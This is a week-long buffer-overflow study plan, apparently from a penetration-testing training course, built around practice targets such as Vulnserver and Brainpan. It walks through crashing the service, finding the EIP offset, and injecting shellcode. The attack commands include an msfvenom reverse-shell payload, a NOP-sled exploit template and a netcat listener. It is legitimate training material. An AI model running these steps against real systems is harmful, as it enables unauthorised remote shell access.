# 💥 Week 5: Buffer Overflows

> _“Anyone can use an exploit. Few can create one.”_  
> Buffer overflows are your rite of passage. This is where you stop being a tool user and become a weapon.

---

## 🎯 Objectives
- Learn how to perform **manual buffer overflow attacks**
- Understand memory layout, registers, and shellcode
- Use tools like `pattern_create`, `pattern_offset`, `gdb`, and `msfvenom`
- Build your own exploit from scratch against a vulnerable service
- Achieve a reverse shell without Metasploit

---

## 🧠 Concepts Covered
- Stack memory layout (EIP, ESP, etc.)
- Finding offset and controlling execution flow
- Writing and placing shellcode
- Avoiding bad characters
- Using `gdb` and `pwndbg` to debug exploits

---

## 🛠 Tools You’ll Master

|Tool|Purpose|
|---|---|
|`gdb` + `pwndbg`|Debugging and memory analysis|
|`pattern_create.rb`|Create unique pattern for offset discovery|
|`pattern_offset.rb`|Find offset in pattern|
|`msfvenom`|Create shellcode payloads|
|`python3`|Write exploit scripts|
|`nasm` / `nasmshell`|(Optional) custom shellcode|

---

## 🧪 Machines / Labs

|Target|Purpose|
|---|---|
|**Vulnserver** (Windows)|Core BOF lab (used in OSCP)|
|**Brainpan** (HTB)|Linux-based BOF + exploitation|
|**TryHackMe BOF Lab**|Supplemental training if needed|

---

## 🗓️ Daily Breakdown

---

### 📅 Monday – Introduction to BOF Concepts

#### ✅ Objectives:
- Understand what a buffer overflow is and how memory works
- Learn about EIP, ESP, and stack behavior
#### 🔧 Tasks:
- Watch the TCM Buffer Overflow videos again
- Build a mental model of stack → buffer → EIP → shellcode flow
#### 📄 Deliverables:
- Create `bof-concepts.md` with definitions:
    - What is EIP?
    - What is a SEH?
    - What’s bad character avoidance?
    - What’s shellcode?

---

### 📅 Tuesday – Setting Up Vulnserver Lab (Windows BOF)

#### ✅ Objectives:
- Run and connect to Vulnserver from Kali
- Send custom payloads to trigger crash
#### 🔧 Tasks:
- Start Windows VM with Vulnserver listening on port 9999
- Use:

```bash
nc <IP> 9999
```

- Send:

```bash
AAAAAAAAA... (long string)
```

- Confirm crash, open `Immunity Debugger` or `gdb` and replicate
#### 📄 Deliverables:
- Screenshot of EIP overwritten with `41414141`

---

### 📅 Wednesday – Finding the Offset

#### ✅ Objectives:
- Use pattern to find exact location of EIP control
#### 🔧 Tasks:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

- Send pattern via Python or `nc`
- View EIP in debugger
- Find offset:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP>
```

#### 📄 Deliverables:
- Offset confirmed
- Screenshot of offset working

---

### 📅 Thursday – Injecting Shellcode

#### ✅ Objectives:
- Replace payload with shellcode
- Ensure space in buffer is enough
- Insert NOP sled + reverse shell
#### 🔧 Tasks:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<your IP> LPORT=4444 -f python -b "\\x00\\x0a\\x0d"
```

- Build final Python exploit:

```python
buffer = "A" * offset + "B" * 4 + "\x90" * 16 + <shellcode>
```

- Run `nc -lvnp 4444`, fire payload
#### 📄 Deliverables:
- Screenshot of SYSTEM shell
- `vulnserver-exploit.py`

---

### 📅 Friday – Root Brainpan (HTB)

#### ✅ Objectives:
- Apply same principles on Linux box
#### 🔧 Tasks:
- Use `gdb` with `pwndbg`
- Repeat: crash → pattern → offset → shellcode
#### 📄 Deliverables:
- `brainpan-report.md`

---

### 📅 Saturday – TryHackMe BOF Lab (Optional)

#### ✅ Objectives:
- Reinforce skills with second environment
- Test multiple shellcode variations

---

### 📅 Sunday – Reflection + Exploit Archive

#### ✅ Objectives:
- Create your own exploit archive
- Reflect on memory safety, writing your own exploit
#### 🔧 Tasks:
- Create:
    - `bof-exploit.py`
    - `bof-checklist.md`
    - `bof-concepts.md`
- Update `ego-log.md`:
    - How confident do you feel controlling EIP?
    - Can you explain every part of your payload?
    - What do you still not fully understand?

---

## ✅ End-of-Week Checklist
-  Rooted Vulnserver via manual BOF
-  Controlled EIP with `pattern_offset`
-  Used `msfvenom` to craft reverse shell payload
-  Rooted Brainpan using custom script
-  Created `bof-checklist.md`
-  Updated `ego-log.md` with reflection